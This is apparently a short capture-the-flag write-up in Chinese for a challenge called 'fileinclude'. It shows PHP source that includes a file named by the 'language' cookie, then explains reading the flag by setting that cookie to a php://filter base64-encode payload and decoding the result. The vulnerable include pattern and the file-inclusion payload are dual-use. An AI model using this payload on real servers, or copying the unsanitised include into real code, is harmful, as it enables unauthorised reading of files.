# fileinclude

查看源码发现里面有php注释，如下

```php
<?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }
error_reporting(E_ALL);
$lan = $_COOKIE['language'];
if(!$lan)
{
	@setcookie("language","english");
	@include("english.php");
}
else
{
	@include($lan.".php");
}
$x=file_get_contents('index.php');
echo $x;
?>
```

存在文件包含，在`cookie`中构造`php://filter/convert.base64-encode/resource=/var/www/html/flag`就能读出flag，然后解码就可以。



